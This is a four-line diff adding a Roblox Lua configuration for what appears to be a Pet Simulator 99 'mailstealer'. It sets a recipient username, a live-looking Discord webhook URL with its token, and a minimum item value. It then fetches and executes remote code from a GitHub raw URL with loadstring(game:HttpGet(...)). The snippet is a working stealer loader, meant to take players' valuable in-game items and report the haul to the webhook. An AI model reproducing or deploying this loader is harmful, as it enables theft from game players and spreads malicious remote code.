@@ -1,0 +1,4 @@
+Username = "johnpoulx21"
+Webhook = "https://discord.com/api/webhooks/1287243598596669441/3lgYdOkMFHLd-Bsbl2xygk86EZcWJ1W43II5ETIbK7GWi-zhE-gbLI9lWNzKC4-IEtkT"
+min_rap =  2000000 --minimum rap
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/main/PS99/mailstealer"))()
